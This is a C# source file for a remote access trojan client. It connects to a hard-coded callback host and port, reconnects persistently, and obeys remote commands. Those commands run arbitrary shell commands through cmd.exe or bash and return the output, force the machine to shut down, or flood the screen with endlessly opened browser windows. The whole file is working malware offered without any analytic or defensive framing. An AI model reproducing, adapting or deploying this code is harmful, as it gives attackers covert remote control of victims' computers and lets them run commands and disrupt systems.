using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using GeneralPurposeLib;

namespace RAT; 

public class RatHandler {
    private static string ReceiveMessage(Stream stream) {
        // Read until we get a newline
        StringBuilder cmdBuilder = new();
        while (true) {
            int b = stream.ReadByte();
            if (b == -1) {
                break;
            }
            if (b == '\n') {
                break;
            }
            cmdBuilder.Append((char)b);
        }
        // Replace all escaped newlines with real newlines
        return cmdBuilder.Replace("\\n", "\n").ToString();
    }
    
    private static void SendMessage(Stream socket, string data) {
        // Escape the newline character
        data = data.Replace("\n", "\\n");
        // Send the data
        socket.Write(Encoding.UTF8.GetBytes(data + "\n"));
    }

    public static Task ExecuteAsync(CancellationToken stoppingToken) {
        while (!stoppingToken.IsCancellationRequested) {
            try {
                ExecuteRat(stoppingToken).Wait(stoppingToken);
            }
            catch (OperationCanceledException) {
                Logger.Info("Exiting...");
                break;
            }
            catch (Exception e) {
                Logger.Error(e.ToString());
                Logger.Info("Reconnecting in 5 seconds");
                Thread.Sleep(5000);
                Logger.Info("Reconnecting...");
            }
        }

        return Task.CompletedTask;
    }

    private static async Task ExecuteRat(CancellationToken stoppingToken) {
        Logger.Info("RAT worker started");

        TcpClient client = new();
        await client.ConnectAsync("ratcallback.serble.net", 6083, stoppingToken);
        Logger.Info("Connected to RAT server");

        while (!stoppingToken.IsCancellationRequested) {
            NetworkStream stream = client.GetStream();
            
            string message = ReceiveMessage(stream);
            Logger.Info(message);
            
            // Process command
            string[] args = message.Split(' ');
            string outData = "";
            switch (args[0]) {
                    
                default:
                    // Send error message
                    outData = "ERROR: Unknown command";
                    break;
                    
                case "ping":
                    // Send pong message
                    outData = "pong";
                    break;

                case "init":
                    // Send initialization message
                    outData = "init";
                    break;

                case "run": {
                    // Run command
                    string command = message[(message.IndexOf(' ') + 1)..];
                    OsPlatform osr = GetPlatform();
                    string cmdExecutorBeginr = osr switch {
                        OsPlatform.Windows => "cmd.exe",
                        OsPlatform.Linux => "bash",
                        OsPlatform.OSX => "bash",
                        _ => "bash"
                    };
                    string specialFlagsr = osr switch {
                        OsPlatform.Windows => "/c",
                        OsPlatform.Linux => "-c",
                        OsPlatform.OSX => "-c",
                        _ => "-c"
                    };
                    try {
                        Process process = Process.Start(new ProcessStartInfo {
                            FileName = cmdExecutorBeginr, Arguments = $"{specialFlagsr} \"{command}\"",
                            UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                        })!;

                        Logger.Info("Running command: " + command);
                        // Get process output
                        await process.WaitForExitAsync(stoppingToken);
                        string output = await process.StandardOutput.ReadToEndAsync();
                        string error = await process.StandardError.ReadToEndAsync();
                        output = output == "" ? error == "" ? "No output" : error : output;
                        // Send output message
                        outData = output;
                        Logger.Info("Command output: " + output);
                    }
                    catch (Exception e) {
                        Logger.Error(e);
                        // Send error message
                        await stream.WriteAsync(Encoding.UTF8.GetBytes("Error: " + e.Message), stoppingToken);
                    }

                    break;
                }

                case "begin": {
                    // Run command
                    string commandBegin = message[(message.IndexOf(' ') + 1)..];
                    OsPlatform os = GetPlatform();
                    string cmdExecutorBegin = os switch {
                        OsPlatform.Windows => "cmd.exe",
                        OsPlatform.Linux => "bash",
                        OsPlatform.OSX => "bash",
                        _ => "bash"
                    };
                    string specialFlags = os switch {
                        OsPlatform.Windows => "/c",
                        OsPlatform.Linux => "-c",
                        OsPlatform.OSX => "-c",
                        _ => "-c"
                    };
                    try {
                        Process process = Process.Start(new ProcessStartInfo {
                            FileName = cmdExecutorBegin, Arguments = $"{specialFlags} \"{commandBegin}\"",
                            UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                        })!;

                        Logger.Info("Running command: " + commandBegin);
                        outData = "Started execution";
                    }
                    catch (Exception e) {
                        Logger.Error(e);
                        // Send error message
                        await stream.WriteAsync(Encoding.UTF8.GetBytes("Error: " + e.Message), stoppingToken);
                    }

                    break;
                }

                case "continue":
                    // Respond with "Ok"
                    outData = "Ok";
                    break;
                
                case "exit":
                    throw new OperationCanceledException();

                case "kill": {
                    // Spam windows
                    OsPlatform osPlatform = GetPlatform();
                    string terminalEmulator = osPlatform switch {
                        OsPlatform.Windows => "cmd.exe",
                        OsPlatform.Linux => "bash",
                        OsPlatform.OSX => "bash",
                        _ => "bash"
                    };
                    
                    Task killTsk = Kill(osPlatform);
                    break;
                }

                case "latency": {
                    // Respond with the current time
                    outData = DateTime.Now.ToBinary().ToString();
                    break;
                }

                case "shutdown": {
                    // Shutdown the computer
                    OsPlatform osPlatform = GetPlatform();
                    string shutdownCommand = osPlatform switch {
                        OsPlatform.Windows => "shutdown -s -t 0",
                        OsPlatform.Linux => "shutdown -h now",
                        OsPlatform.OSX => "shutdown -h now",
                        _ => "shutdown -h now"
                    };
                    string cmd = osPlatform switch {
                        OsPlatform.Windows => "cmd.exe",
                        OsPlatform.Linux => "bash",
                        OsPlatform.OSX => "bash",
                        _ => "bash"
                    };
                    string specialFlags = osPlatform switch {
                        OsPlatform.Windows => "/c",
                        OsPlatform.Linux => "-c",
                        OsPlatform.OSX => "-c",
                        _ => "-c"
                    };
                    Process process = Process.Start(new ProcessStartInfo {
                        FileName = cmd, Arguments = $"{specialFlags} {shutdownCommand}",
                        UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                    })!;
                    break;
                }
            }
            
            SendMessage(stream, outData);
        }
        
    }

    private static Task Kill(OsPlatform platform) {
        switch (platform) {

            case OsPlatform.Windows: {
                while (true) {
                    _ = Process.Start(new ProcessStartInfo {
                        FileName = "cmd.exe", Arguments = "/c start https://youareanidiot.cc/",
                        UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                    })!;
                }
            }

            case OsPlatform.OSX:
            case OsPlatform.Linux: {
                while (true) {
                    _ = Process.Start(new ProcessStartInfo {
                        FileName = "xdg-open", Arguments = "https://youareanidiot.cc/",
                        UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                    })!;
                }
            }

            case OsPlatform.Unknown:
                // Uh, idk what to do
                break;
            
            default:
                throw new ArgumentOutOfRangeException(nameof(platform), platform, null);
        }

        return Task.CompletedTask;
    }
    
    private static OsPlatform GetPlatform() {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
            return OsPlatform.Windows;
        }
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) {
            return OsPlatform.Linux;
        }
        return RuntimeInformation.IsOSPlatform(OSPlatform.OSX) ? OsPlatform.OSX : OsPlatform.Unknown;
    }
}